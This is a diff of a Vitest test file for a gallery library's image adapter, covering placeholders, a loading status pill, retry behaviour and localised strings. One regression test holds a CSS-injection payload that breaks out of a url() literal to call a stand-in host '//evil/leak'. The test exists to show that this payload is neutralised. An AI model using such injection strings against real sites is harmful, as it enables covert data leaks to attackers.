@@ -1,7 +1,8 @@
 // @vitest-environment happy-dom
 
 import type { AdapterCtx, Item } from '@gallerist/core'
-import { describe, expect, it } from 'vitest'
+import { afterEach, describe, expect, it, vi } from 'vitest'
+import { DEFAULT_STRINGS } from '../strings'
 import { imageAdapter } from './image'
 
 const ctx = (over: Partial<AdapterCtx> = {}): AdapterCtx => ({
@@ -51,25 +52,245 @@ describe('imageAdapter', () => {
     expect(m.element.getAttribute('fetchpriority')).toBe('high')
   })
 
-  it('paints a color placeholder immediately', () => {
-    const m = imageAdapter().mount(img({ placeholder: '#123456' }), slot(), ctx())
-    expect(m.element.style.backgroundColor).toBeTruthy()
+  it('paints a colour placeholder as a flat fill in the image box, at once', () => {
+    const s = slot()
+    imageAdapter().mount(img({ placeholder: 'rgb(1 2 3 / 50%)' }), s, ctx())
+    const box = s.querySelector<HTMLElement>('.gallerist-media-placeholder')
+    expect(box?.style.backgroundColor).toBeTruthy()
+    expect(box?.hasAttribute('data-gallerist-skeleton')).toBe(false)
+    expect(box?.querySelector('img, .gallerist-media-pill')).toBeNull() // no pill for a colour
+    // under the image, so the image fades in over it
+    expect(box?.nextElementSibling).toBe(s.querySelector('.gallerist-media-image'))
   })
 
-  it('paints a data-URI placeholder as a background image', () => {
+  it('shows an image placeholder in its own layer, with a pill, in the box of the naturalSize', () => {
+    const s = slot()
     const m = imageAdapter().mount(
-      img({ placeholder: 'data:image/png;base64,AAAA' }),
-      slot(),
+      img({ placeholder: 'data:image/png;base64,AAAA', naturalSize: { w: 1600, h: 900 } }),
+      s,
       ctx(),
     )
-    expect(m.element.style.backgroundImage).toContain('data:image/png')
+    const box = s.querySelector<HTMLElement>('.gallerist-media-placeholder')
+    expect(box?.style.getPropertyValue('--gallerist-media-ratio')).toBe('1600 / 900')
+    expect(box?.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,AAAA')
+    expect(box?.querySelector('img')?.alt).toBe('') // decorative: the image's alt names it
+    expect(m.element.style.backgroundImage).toBe('') // nothing painted on the hidden <img>
+    const status = box?.querySelector('.gallerist-media-pill [role="status"]')
+    expect(status).not.toBeNull()
+    expect(box?.querySelector('button')).toBeNull()
   })
 
-  it('rejects a placeholder that breaks out of the url("…") literal', () => {
-    // contains "/" so it passes the path heuristic, but the embedded quote would inject a
-    // second comma-separated url() → attacker-controlled image request. Must be rejected.
-    const m = imageAdapter().mount(img({ placeholder: 'x"), url("//evil/leak?c=' }), slot(), ctx())
+  describe("the pill's status line", () => {
+    afterEach(() => {
+      vi.useRealTimers()
+      vi.restoreAllMocks()
+    })
+    const pill = (s: HTMLElement) => s.querySelector('.gallerist-media-pill [role="status"]')
+
+    it('is empty until the loading delay, then says it once', () => {
+      vi.useFakeTimers()
+      const s = slot()
+      imageAdapter().mount(img({ placeholder: 'a-thumb.jpg' }), s, ctx())
+      expect(pill(s)?.textContent).toBe('')
+      vi.advanceTimersByTime(399)
+      expect(pill(s)?.textContent).toBe('')
+      vi.advanceTimersByTime(1)
+      expect(pill(s)?.textContent).toBe('Loading full size…')
+    })
+
+    it('takes the delay from --gallerist-loading-delay', () => {
+      vi.useFakeTimers()
+      const real = window.getComputedStyle
+      vi.spyOn(window, 'getComputedStyle').mockImplementation((el) => {
+        const style = real(el)
+        const get = style.getPropertyValue.bind(style)
+        style.getPropertyValue = (name: string) =>
+          name === '--gallerist-loading-delay' ? ' 1.5s' : get(name)
+        return style
+      })
+      const s = slot()
+      imageAdapter().mount(img({ placeholder: 'a-thumb.jpg' }), s, ctx())
+      vi.advanceTimersByTime(1499)
+      expect(pill(s)?.textContent).toBe('')
+      vi.advanceTimersByTime(1)
+      expect(pill(s)?.textContent).toBe('Loading full size…')
+    })
+
+    it('says nothing on a fast load and leaves no timer', async () => {
+      vi.useFakeTimers()
+      const s = slot()
+      const m = imageAdapter().mount(img({ placeholder: 'a-thumb.jpg' }), s, ctx())
+      const status = pill(s)
+      m.element.dispatchEvent(new Event('load'))
+      await m.ready
+      expect(vi.getTimerCount()).toBe(0)
+      vi.advanceTimersByTime(1000)
+      expect(status?.textContent).toBe('')
+    })
+
+    it('leaves no timer after destroy or an abort (navigation)', () => {
+      vi.useFakeTimers()
+      const m = imageAdapter().mount(img({ placeholder: 'a-thumb.jpg' }), slot(), ctx())
+      expect(vi.getTimerCount()).toBe(1)
+      m.destroy()
+      expect(vi.getTimerCount()).toBe(0)
+      const abort = new AbortController()
+      imageAdapter().mount(
+        img({ placeholder: 'a-thumb.jpg' }),
+        slot(),
+        ctx({ signal: abort.signal }),
+      )
+      expect(vi.getTimerCount()).toBe(1)
+      abort.abort()
+      expect(vi.getTimerCount()).toBe(0)
+    })
+
+    it('says the failure when it fails, before the delay too', async () => {
+      vi.useFakeTimers()
+      const s = slot()
+      const m = imageAdapter().mount(img({ placeholder: 'a-thumb.jpg' }), s, ctx())
+      m.element.dispatchEvent(new Event('error'))
+      await expect(m.ready).rejects.toThrow()
+      expect(pill(s)?.textContent).toBe('Couldn’t load full size')
+      expect(vi.getTimerCount()).toBe(0)
+    })
+
+    it('has no pill (and no timer) for a colour or no placeholder', () => {
+      vi.useFakeTimers()
+      for (const placeholder of ['#123', undefined]) {
+        const s = slot()
+        imageAdapter().mount(img({ placeholder }), s, ctx())
+        expect(s.querySelector('.gallerist-media-pill')).toBeNull()
+      }
+      expect(vi.getTimerCount()).toBe(0)
+    })
+  })
+
+  it('a bare word the browser does not parse as a colour is an image URL', () => {
+    vi.stubGlobal('CSS', { supports: (_p: string, v?: string) => v !== 'thumb' })
+    try {
+      const s = slot()
+      imageAdapter().mount(img({ placeholder: 'thumb' }), s, ctx())
+      expect(s.querySelector('.gallerist-media-placeholder img')?.getAttribute('src')).toBe('thumb')
+      const red = slot()
+      imageAdapter().mount(img({ placeholder: 'red' }), red, ctx())
+      expect(
+        red.querySelector<HTMLElement>('.gallerist-media-placeholder')?.style.backgroundColor,
+      ).toBe('red')
+    } finally {
+      vi.unstubAllGlobals()
+    }
+  })
+
+  it('takes the ratio from the placeholder image when the item has no naturalSize', () => {
+    const s = slot()
+    imageAdapter().mount(img({ placeholder: 'thumbs/a.jpg' }), s, ctx())
+    const pv = s.querySelector<HTMLImageElement>('.gallerist-media-placeholder img')
+    expect(pv).not.toBeNull()
+    if (!pv) return
+    Object.defineProperty(pv, 'naturalWidth', { value: 320 })
+    Object.defineProperty(pv, 'naturalHeight', { value: 180 })
+    pv.dispatchEvent(new Event('load'))
+    const box = s.querySelector<HTMLElement>('.gallerist-media-placeholder')
+    expect(box?.style.getPropertyValue('--gallerist-media-ratio')).toBe('320 / 180')
+  })
+
+  it('shows a skeleton box with no placeholder', () => {
+    const s = slot()
+    imageAdapter().mount(img(), s, ctx())
+    const box = s.querySelector('.gallerist-media-placeholder')
+    expect(box?.hasAttribute('data-gallerist-skeleton')).toBe(true)
+    expect(box?.children.length).toBe(0)
+  })
+
+  it('hides the placeholder and drops the pill once the image has loaded', async () => {
+    const s = slot()
+    const m = imageAdapter().mount(img({ placeholder: 'a-thumb.jpg' }), s, ctx())
+    m.element.dispatchEvent(new Event('load'))
+    await m.ready
+    const box = s.querySelector('.gallerist-media-placeholder')
+    expect(box?.hasAttribute('data-gallerist-loaded')).toBe(true)
+    expect(s.querySelector('.gallerist-media-pill')).toBeNull()
+    m.destroy()
+    expect(s.children.length).toBe(0)
+  })
+
+  it('keeps an image placeholder on a failure, and the pill offers Retry (no error card)', async () => {
+    const s = slot()
+    let retried = 0
+    const m = imageAdapter().mount(
+      img({ placeholder: 'a-thumb.jpg', alt: 'Chart' }),
+      s,
+      ctx({ retry: () => retried++ } as Partial<AdapterCtx>),
+    )
+    const status = s.querySelector('.gallerist-media-pill [role="status"]')
+    m.element.dispatchEvent(new Event('error'))
+    await expect(m.ready).rejects.toThrow()
+    expect(s.querySelector('.gallerist-media-error')).toBeNull()
+    const box = s.querySelector('.gallerist-media-placeholder')
+    expect(box?.hasAttribute('data-gallerist-error')).toBe(true)
+    // the same live region says it (a new one might not be announced)
+    expect(s.querySelector('.gallerist-media-pill [role="status"]')).toBe(status)
+    expect(status?.textContent).toBe('Couldn’t load full size')
+    const retry = s.querySelector<HTMLButtonElement>('.gallerist-media-pill button')
+    expect(retry?.type).toBe('button')
+    expect(retry?.textContent).toBe('Retry')
+    retry?.click()
+    expect(retried).toBe(1)
+  })
+
+  it('takes the pill text from the renderer strings, and shows no Retry without a retry', async () => {
+    const s = slot()
+    const strings = {
+      ...DEFAULT_STRINGS,
+      loadingFull: 'Chargement…',
+      loadFailed: 'Échec',
+      retry: 'Réessayer',
+    }
+    vi.useFakeTimers()
+    const early = slot()
+    imageAdapter().mount(
+      img({ placeholder: 'a-thumb.jpg' }),
+      early,
+      ctx({
+        strings,
+      } as Partial<AdapterCtx>),
+    )
+    vi.advanceTimersByTime(400)
+    expect(early.querySelector('.gallerist-media-pill [role="status"]')?.textContent).toBe(
+      'Chargement…',
+    )
+    vi.useRealTimers()
+    const m = imageAdapter().mount(
+      img({ placeholder: 'a-thumb.jpg' }),
+      s,
+      ctx({ strings } as Partial<AdapterCtx>),
+    )
+    const status = s.querySelector('.gallerist-media-pill [role="status"]')
+    m.element.dispatchEvent(new Event('error'))
+    await expect(m.ready).rejects.toThrow()
+    expect(status?.textContent).toBe('Échec')
+    expect(s.querySelector('.gallerist-media-pill button')).toBeNull()
+  })
+
+  it('shows the error card on a failure with a colour placeholder, without the box', async () => {
+    const s = slot()
+    const m = imageAdapter().mount(img({ placeholder: '#123456' }), s, ctx())
+    m.element.dispatchEvent(new Event('error'))
+    await expect(m.ready).rejects.toThrow()
+    expect(s.querySelector('.gallerist-media-error')).not.toBeNull()
+    expect(s.querySelector('.gallerist-media-placeholder')).toBeNull()
+  })
+
+  it('never paints a placeholder through CSS (no url() to break out of)', () => {
+    // an embedded quote once could inject a second url() → attacker-controlled request; the
+    // placeholder is now an <img> src, never CSS text
+    const s = slot()
+    const m = imageAdapter().mount(img({ placeholder: 'x"), url("//evil/leak?c=' }), s, ctx())
     expect(m.element.style.backgroundImage).toBe('')
+    const box = s.querySelector<HTMLElement>('.gallerist-media-placeholder')
+    expect(box?.style.backgroundImage).toBe('')
+    expect(box?.querySelector('img')?.getAttribute('src')).toBe('x"), url("//evil/leak?c=')
   })
 
   it('returns the naturalSize hint without a load', () => {
